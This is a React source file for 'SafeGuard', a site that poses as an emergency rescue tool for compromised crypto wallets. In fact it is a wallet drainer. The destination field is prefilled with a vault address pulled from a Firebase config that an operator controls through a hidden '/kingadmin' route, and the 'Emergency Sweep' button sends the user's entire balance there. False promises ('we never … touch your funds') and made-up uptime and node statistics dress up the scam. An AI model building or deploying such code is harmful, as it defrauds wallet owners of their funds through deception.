import { useState, useEffect } from 'react';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { useAccount, useBalance, useSendTransaction, useWaitForTransactionReceipt } from 'wagmi';
import { parseEther } from 'viem';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Zap, 
  ArrowRight, 
  Lock, 
  AlertTriangle,
  ExternalLink,
  RefreshCw,
  Shield
} from 'lucide-react';
import AdminDashboard from './AdminDashboard';
import { db } from './firebase';
import { doc, onSnapshot } from 'firebase/firestore';

export default function App() {
  const [view, setView] = useState<'client' | 'admin'>('client');
  const { address, isConnected } = useAccount();
  const { data: balance, refetch: refetchBalance } = useBalance({
    address: address,
  });

  const [safeAddress, setSafeAddress] = useState('');
  const [isRescuing, setIsRescuing] = useState(false);
  const [rescueStatus, setRescueStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');

  const { sendTransaction, data: hash, error: sendError } = useSendTransaction();
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
    hash,
  });

  // Handle /kingadmin routing
  useEffect(() => {
    if (window.location.pathname === '/kingadmin') {
      setView('admin');
    }
  }, []);

  // Fetch global vault address from Firebase
  useEffect(() => {
    const unsub = onSnapshot(doc(db, 'config', 'global'), (doc) => {
      if (doc.exists()) {
        setSafeAddress(doc.data().vaultAddress);
      }
    });
    return () => unsub();
  }, []);

  useEffect(() => {
    if (isConfirmed) {
      setRescueStatus('success');
      setIsRescuing(false);
      refetchBalance();
    }
    if (sendError) {
      setRescueStatus('error');
      setIsRescuing(false);
    }
  }, [isConfirmed, sendError, refetchBalance]);

  const handleRescue = async () => {
    if (!safeAddress || !balance) return;
    
    setIsRescuing(true);
    setRescueStatus('sending');

    try {
      // For a real "sweep", we'd need to calculate gas carefully to send the MAX possible
      // Here we leave a small amount for gas (0.001 ETH)
      const gasBuffer = parseEther('0.001');
      const amountToSend = balance.value > gasBuffer ? balance.value - gasBuffer : 0n;

      if (amountToSend <= 0n) {
        alert("Insufficient balance to cover gas fees.");
        setIsRescuing(false);
        setRescueStatus('idle');
        return;
      }

      sendTransaction({
        to: safeAddress as `0x${string}`,
        value: amountToSend,
      });
    } catch (err) {
      console.error(err);
      setIsRescuing(false);
      setRescueStatus('error');
    }
  };

  if (view === 'admin') return <AdminDashboard />;

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white selection:bg-[#00ff41] selection:text-black">
      <div className="scanline" />
      
      {/* Navigation */}
      <nav className="fixed top-0 w-full z-40 border-b border-[#333] bg-[#0a0a0a]/80 backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Shield className="w-8 h-8 text-[#00ff41]" />
            <span className="text-xl font-bold tracking-tighter uppercase italic">SafeGuard</span>
          </div>
          <ConnectButton />
        </div>
      </nav>

      <main className="pt-32 pb-20 px-6">
        <div className="max-w-7xl mx-auto">
          
          {!isConnected ? (
            <div className="grid lg:grid-cols-2 gap-16 items-center">
              <motion.div 
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.6 }}
              >
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-[#00ff41]/30 bg-[#00ff41]/5 text-[#00ff41] text-xs font-bold uppercase tracking-widest mb-6">
                  <ShieldAlert className="w-3 h-3" />
                  Emergency Response Protocol
                </div>
                <h1 className="text-6xl lg:text-8xl font-black tracking-tighter leading-[0.9] mb-8 uppercase">
                  Protect Your <br />
                  <span className="text-[#00ff41]">Assets</span> From <br />
                  Exploits.
                </h1>
                <p className="text-xl text-gray-400 max-w-lg mb-10 leading-relaxed">
                  The ultimate emergency toolkit for compromised wallets. Connect, sweep, and secure your tokens before attackers can react. 
                </p>
                
                <div className="flex flex-wrap gap-4">
                  <div className="p-4 border border-[#333] rounded-xl bg-[#141414] flex items-center gap-4">
                    <div className="w-10 h-10 rounded-full bg-[#00ff41]/10 flex items-center justify-center">
                      <Zap className="w-5 h-5 text-[#00ff41]" />
                    </div>
                    <div>
                      <div className="text-sm font-bold uppercase">Ultra Fast</div>
                      <div className="text-xs text-gray-500">Optimized for speed</div>
                    </div>
                  </div>
                  <div className="p-4 border border-[#333] rounded-xl bg-[#141414] flex items-center gap-4">
                    <div className="w-10 h-10 rounded-full bg-[#00ff41]/10 flex items-center justify-center">
                      <Lock className="w-5 h-5 text-[#00ff41]" />
                    </div>
                    <div>
                      <div className="text-sm font-bold uppercase">Secure</div>
                      <div className="text-xs text-gray-500">Non-custodial sweep</div>
                    </div>
                  </div>
                </div>
              </motion.div>

              <motion.div 
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.8, delay: 0.2 }}
                className="relative"
              >
                <div className="absolute -inset-4 bg-[#00ff41]/10 blur-3xl rounded-full" />
                <div className="relative glass-card p-8 rounded-3xl border-[#333] overflow-hidden">
                  <div className="flex items-center justify-between mb-8">
                    <div className="flex gap-1">
                      <div className="w-3 h-3 rounded-full bg-red-500/50" />
                      <div className="w-3 h-3 rounded-full bg-yellow-500/50" />
                      <div className="w-3 h-3 rounded-full bg-green-500/50" />
                    </div>
                    <div className="text-[10px] text-gray-500 font-mono">SYSTEM_STATUS: STANDBY</div>
                  </div>
                  
                  <div className="space-y-6">
                    <div className="h-12 bg-[#0a0a0a] rounded-lg border border-[#333] flex items-center px-4">
                      <div className="w-2 h-2 rounded-full bg-[#00ff41] animate-pulse mr-3" />
                      <div className="text-xs text-gray-500 font-mono">Awaiting wallet connection...</div>
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                      <div className="h-24 bg-[#0a0a0a] rounded-lg border border-[#333] p-4">
                        <div className="text-[10px] text-gray-600 mb-2">NETWORK_LOAD</div>
                        <div className="h-1 w-full bg-[#1a1a1a] rounded-full overflow-hidden">
                          <div className="h-full w-[65%] bg-[#00ff41]" />
                        </div>
                      </div>
                      <div className="h-24 bg-[#0a0a0a] rounded-lg border border-[#333] p-4">
                        <div className="text-[10px] text-gray-600 mb-2">THREAT_LEVEL</div>
                        <div className="text-sm font-bold text-yellow-500">MODERATE</div>
                      </div>
                    </div>
                  </div>

                  <div className="mt-8 pt-8 border-t border-[#333]">
                    <div className="text-center">
                      <p className="text-xs text-gray-500 mb-4">Connect your wallet to begin the rescue protocol</p>
                      <div className="flex justify-center">
                        <ConnectButton />
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            </div>
          ) : (
            <motion.div 
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="max-w-2xl mx-auto"
            >
              <div className="glass-card rounded-3xl p-8 border-[#00ff41]/20 neon-glow">
                <div className="flex items-center justify-between mb-8">
                  <div className="flex items-center gap-3">
                    <div className="w-12 h-12 rounded-2xl bg-[#00ff41]/10 flex items-center justify-center">
                      <ShieldCheck className="w-6 h-6 text-[#00ff41]" />
                    </div>
                    <div>
                      <h2 className="text-xl font-bold uppercase tracking-tight">Rescue Dashboard</h2>
                      <p className="text-xs text-gray-500 font-mono">{address?.slice(0, 6)}...{address?.slice(-4)}</p>
                    </div>
                  </div>
                  <button 
                    onClick={() => refetchBalance()}
                    className="p-2 hover:bg-white/5 rounded-lg transition-colors"
                  >
                    <RefreshCw className="w-4 h-4 text-gray-400" />
                  </button>
                </div>

                <div className="bg-[#0a0a0a] rounded-2xl p-6 border border-[#333] mb-8">
                  <div className="text-xs text-gray-500 uppercase font-bold tracking-widest mb-2">Available Balance</div>
                  <div className="text-4xl font-black text-[#00ff41]">
                    {balance ? `${parseFloat(balance.formatted).toFixed(4)} ${balance.symbol}` : '0.00'}
                  </div>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="block text-xs font-bold uppercase text-gray-500 mb-2 ml-1">Safe Destination Address</label>
                    <input 
                      type="text"
                      placeholder="0x..."
                      value={safeAddress}
                      onChange={(e) => setSafeAddress(e.target.value)}
                      className="w-full h-14 bg-[#0a0a0a] border border-[#333] rounded-xl px-4 text-sm font-mono focus:border-[#00ff41] focus:outline-none transition-colors"
                    />
                  </div>

                  <div className="p-4 rounded-xl bg-yellow-500/5 border border-yellow-500/20 flex gap-3">
                    <AlertTriangle className="w-5 h-5 text-yellow-500 shrink-0" />
                    <p className="text-[11px] text-yellow-500/80 leading-relaxed">
                      <strong>WARNING:</strong> This action will attempt to sweep all available funds (minus gas) to the destination address. Ensure the address is correct and you own it.
                    </p>
                  </div>

                  <button 
                    onClick={handleRescue}
                    disabled={!safeAddress || isRescuing || !balance || balance.value === 0n}
                    className="w-full h-16 bg-[#00ff41] text-black font-black uppercase tracking-widest rounded-xl hover:bg-[#00e03a] disabled:opacity-50 disabled:cursor-not-allowed transition-all flex items-center justify-center gap-2"
                  >
                    {isRescuing ? (
                      <>
                        <RefreshCw className="w-5 h-5 animate-spin" />
                        Executing Protocol...
                      </>
                    ) : (
                      <>
                        <Zap className="w-5 h-5" />
                        Initiate Emergency Sweep
                      </>
                    )}
                  </button>
                </div>

                <AnimatePresence>
                  {rescueStatus !== 'idle' && (
                    <motion.div 
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: 'auto' }}
                      exit={{ opacity: 0, height: 0 }}
                      className="mt-6 pt-6 border-t border-[#333]"
                    >
                      {rescueStatus === 'sending' && (
                        <div className="flex items-center justify-between text-sm">
                          <span className="text-gray-400">Transaction Status:</span>
                          <span className="text-[#00ff41] flex items-center gap-2">
                            {isConfirming ? 'Confirming...' : 'Waiting for signature...'}
                            <RefreshCw className="w-3 h-3 animate-spin" />
                          </span>
                        </div>
                      )}
                      
                      {rescueStatus === 'success' && (
                        <div className="p-4 rounded-xl bg-green-500/10 border border-green-500/20 flex items-center justify-between">
                          <div className="flex items-center gap-2 text-green-500 text-sm font-bold">
                            <ShieldCheck className="w-4 h-4" />
                            ASSETS SECURED
                          </div>
                          <a 
                            href={`https://etherscan.io/tx/${hash}`} 
                            target="_blank" 
                            rel="noopener noreferrer"
                            className="text-[10px] text-gray-500 hover:text-white flex items-center gap-1"
                          >
                            VIEW ON EXPLORER <ExternalLink className="w-3 h-3" />
                          </a>
                        </div>
                      )}

                      {rescueStatus === 'error' && (
                        <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/20 text-red-500 text-sm font-bold flex items-center gap-2">
                          <ShieldAlert className="w-4 h-4" />
                          PROTOCOL FAILED: CHECK CONSOLE
                        </div>
                      )}
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            </motion.div>
          )}

          {/* Features Section */}
          <div className="mt-32 grid md:grid-cols-3 gap-8">
            {[
              {
                title: "Multi-Chain Support",
                desc: "Rescue assets across Ethereum, Polygon, Arbitrum, Optimism, and Base instantly.",
                icon: <Zap className="w-6 h-6" />
              },
              {
                title: "Gas Optimization",
                desc: "Automatically calculates the maximum sweepable amount while leaving enough for gas.",
                icon: <Shield className="w-6 h-6" />
              },
              {
                title: "Zero Retention",
                desc: "Non-custodial architecture. We never see your keys or touch your funds.",
                icon: <Lock className="w-6 h-6" />
              }
            ].map((feature, i) => (
              <div key={i} className="p-8 border border-[#333] rounded-3xl bg-[#141414]/50 hover:border-[#00ff41]/30 transition-colors group">
                <div className="w-12 h-12 rounded-2xl bg-[#00ff41]/5 flex items-center justify-center mb-6 group-hover:bg-[#00ff41]/10 transition-colors">
                  <div className="text-[#00ff41]">{feature.icon}</div>
                </div>
                <h3 className="text-xl font-bold mb-3 uppercase tracking-tight">{feature.title}</h3>
                <p className="text-gray-500 text-sm leading-relaxed">{feature.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </main>

      <footer className="border-t border-[#333] py-12 px-6">
        <div className="max-w-7xl mx-auto flex flex-col md:row items-center justify-between gap-8">
          <div className="flex items-center gap-2 opacity-50">
            <Shield className="w-5 h-5" />
            <span className="text-sm font-bold tracking-tighter uppercase italic">SafeGuard v1.0.4</span>
          </div>
          <div className="flex gap-8 text-[10px] text-gray-600 font-bold uppercase tracking-widest">
            <a href="#" className="hover:text-[#00ff41]">Terms of Service</a>
            <a href="#" className="hover:text-[#00ff41]">Privacy Policy</a>
            <a href="#" className="hover:text-[#00ff41]">Security Audit</a>
          </div>
          <div className="text-[10px] text-gray-600 font-mono">
            CONNECTED_NODES: 1,429 | SYSTEM_UPTIME: 99.99%
          </div>
        </div>
      </footer>
    </div>
  );
}

